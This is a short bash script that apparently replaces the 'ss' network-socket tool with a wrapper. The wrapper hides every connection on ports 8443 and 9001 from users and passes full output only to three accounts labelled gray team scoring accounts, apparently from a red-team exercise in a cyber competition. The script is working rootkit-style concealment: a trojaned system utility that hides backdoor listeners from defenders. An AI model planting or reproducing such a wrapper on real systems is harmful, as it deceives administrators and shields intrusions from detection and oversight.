#!/bin/bash
REAL_SS="/usr/sbin/ss"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SS "$@" ;;
esac

TMP_OUT=$("$REAL_SS" "$@" 2>&1)
RC=$?

while IFS= read -r line; do
    if echo "$line" | grep -qE ":(8443|9001) "; then
        :
    else
        echo "$line"
    fi
done <<< "$TMP_OUT"

exit $RC
